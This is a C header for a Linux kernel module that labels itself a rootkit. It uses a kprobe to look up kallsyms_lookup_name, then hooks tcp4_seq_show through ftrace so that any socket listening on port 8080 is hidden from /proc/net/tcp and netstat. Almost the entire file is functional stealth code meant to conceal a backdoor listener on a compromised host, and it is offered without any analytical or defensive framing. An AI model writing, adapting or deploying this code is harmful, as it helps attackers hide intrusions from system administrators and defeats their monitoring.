#ifndef SOCKET_H
#define SOCKET_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/ptrace.h>
#include <linux/syscalls.h>
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp2 = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif
#include <linux/seq_file.h>
#include <linux/namei.h>
#include <linux/ftrace.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/linkage.h>
#include <linux/tcp.h>
#define USE_FENTRY_OFFSET 0
#define HOOK(_name, _hook, _orig)   \
{                   \
    .name = (_name),        \
    .function = (_hook),        \
    .original = (_orig),        \
}
static asmlinkage long (*org_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v);

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long addr;
	struct ftrace_ops ops;
};


static void notrace register_callback_hook(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

/*#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long) hook->function;
#else*/
	if(!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long) hook->function;
//#endif
}

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp2);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp2.addr;
    unregister_kprobe(&kp2);
#endif

	hook->addr = kallsyms_lookup_name(hook->name);

	if (!hook->addr)
	{
		printk(KERN_DEBUG "rootkit: unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

/*#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->addr + MCOUNT_INSN_SIZE;
#else*/
	*((unsigned long*) hook->original) = hook->addr;
//#endif

	return 0;
}
static int install_hook(struct ftrace_hook *f_hook)
{
    int ret;
    //fill the structs
    //we asume that his name and hook func already configired
    //f_hook->addr = kallsyms_lookup_name(f_hook->name);
   // *((unsigned long *)org_tcp4_seq_show) = f_hook->addr;
    ret = fh_resolve_hook_address(f_hook);
    if (ret)
        return ret;
    f_hook->ops.func = register_callback_hook;
    f_hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                | FTRACE_OPS_FL_RECURSION_SAFE
                | FTRACE_OPS_FL_IPMODIFY;
    ret = ftrace_set_filter_ip(&f_hook->ops, f_hook->addr, 0, 0);
    ret = register_ftrace_function(&f_hook->ops);
    return ret;

}
void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;
	err = unregister_ftrace_function(&hook->ops);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
	}

	//err = ftrace_set_filter_ip(&hook->ops, hook->addr, 1, 0);
	if(err)
	{
		printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
	}
}
struct ftrace_hook tcp4_hook = HOOK("tcp4_seq_show", hook_tcp4_seq_show, &org_tcp4_seq_show);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    long ret;
    struct sock *sk = v;
    if (sk != 0x1 && sk->sk_num == 0x1f90)
    {
		printk(KERN_ALERT "rootkit: Found process listening on port 8080 - hiding!\n");
		return 0;
	}
    ret = org_tcp4_seq_show(seq, v);
    return ret;

}
static int HideSocketsFromNetstat(void)
{
    int ret;
    ret = install_hook(&tcp4_hook);
    //ret = set_ops("/proc/net/tcp");
    printk(KERN_ALERT "set ops done, ret equals to : %d", ret);

    return 1;
}
static void StopHideSocketsFromNetstat(void)
{
    fh_remove_hook(&tcp4_hook);
}
                                                
#endif